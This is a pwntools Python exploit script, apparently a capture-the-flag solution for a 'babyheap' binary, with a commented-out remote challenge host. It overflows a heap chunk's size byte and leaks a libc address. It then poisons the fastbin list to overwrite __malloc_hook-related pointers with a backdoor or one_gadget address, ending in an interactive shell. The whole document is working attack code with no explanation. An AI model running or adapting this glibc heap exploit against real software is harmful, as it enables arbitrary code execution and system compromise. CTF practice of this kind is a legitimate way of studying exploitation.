from pwn import * 
from LibcSearcher import * 

p=process('./babyheap')
# p=remote('t.ctf.qwq.cc',49786)
libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so')
# pause()
elf=ELF('./babyheap')
def show(index,length):
    p.recvuntil(b'\noption> ')
    p.sendline(b'1')
    p.recvuntil(b'Input index:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Input length:\n')
    p.sendline(str(length).encode())
def create(index,length,content):
    p.recvuntil(b'\noption> ')
    p.sendline(b'2')
    p.recvuntil(b'Input index:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Input length (16~80):\n')
    p.sendline(str(length).encode())
    p.recvuntil(b'Input content:\n')
    p.sendline(content)
def delete(index):
    p.recvuntil(b'\noption> ')
    p.sendline(b'3')
    p.recvuntil(b'Input index:\n')
    p.sendline(str(index).encode())
def edit(index,content):
    p.recvuntil(b'\noption> ')
    p.sendline(b'4')
    p.recvuntil(b'Input index:\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Input content:\n')
    p.sendline(content)
buf_addr=0x4040c0
backdoor=0x00000000004016DD
create(0,0x18,b'aaaa') 
create(1,0x48,b'bbbb') 
create(2,0x48,b'cccc') 
create(3,0x18,b'dddd') 
payload=b'f'*0x18+b'\xa1'
edit(0,payload)
delete(1)
show(0,0x30)
p.recv(0x28)
leak =u64(p.recv(8))
print(hex(leak))
libcbase=leak-(0x7f0f7b9c3c08-0x7f0f7b600000)+0x90
hook=libcbase+libc.sym['__malloc_hook']
one_gadget=libcbase+0x45206
print(hex(hook))

create(1,0x48,b'nnnn')
create(6,0x48,b'tttt')
create(4,0x18,b'mmmm')
create(5,0x18,b'tttt')
create(7,0x21,b'tttt')
# pause()
delete(4)
delete(5)
delete(6)
payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0x404120+8)
edit(3,payload)
create(4,0x18,b'mmmm')
create(5,0x18,b'mmmm')
pause()
payload=p64(hook)
edit(5,payload)
pause()
# edit(7,b'\xdd\x16\x40\x00\x00\x00\x00')
# print(len(p64(one_gadget)[0:7]))
# edit(7,p64(one_gadget)[0:7])
edit(7,b'\xdd\x16\x40\x00\x00\x00\x00')
pause()
create(8,0x50,b'nnnn')

p.interactive()